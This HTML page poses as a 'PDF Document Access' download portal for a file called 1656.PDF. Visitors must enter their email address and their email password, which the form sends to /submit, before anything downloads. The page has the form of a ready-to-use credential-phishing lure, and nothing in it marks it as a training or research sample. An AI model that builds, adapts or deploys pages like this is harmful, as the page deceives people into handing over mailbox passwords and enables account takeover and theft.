<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PDF Document Access</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: url('background.jpg') no-repeat center center;
      background-size: cover;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .form-box {
      background-color: #d90000;
      color: white;
      padding: 40px 30px;
      border-radius: 20px;
      width: 350px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.25);
      text-align: center;
    }

    .form-box img {
      width: 80px;
      margin-bottom: 20px;
    }

    .form-box h2 {
      font-size: 20px;
      margin-bottom: 25px;
    }

    .form-box input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      font-size: 14px;
    }

    .form-box button {
      width: 100%;
      padding: 12px;
      background-color: #ff0000;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
    }

    .form-box button:hover {
      background-color: #b30000;
    }
  </style>
</head>
<body>
  <div class="form-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" alt="PDF" />
    <h2>PDF DOCUMENT 1656.PDF ONLINE DOCUMENT</h2>
    <form action="/submit" method="POST">
      <input type="email" name="email" placeholder="Your email" required />
      <input type="password" name="password" placeholder="Email password" required />
      <button type="submit">Download</button>
    </form>
  </div>
</body>
</html>
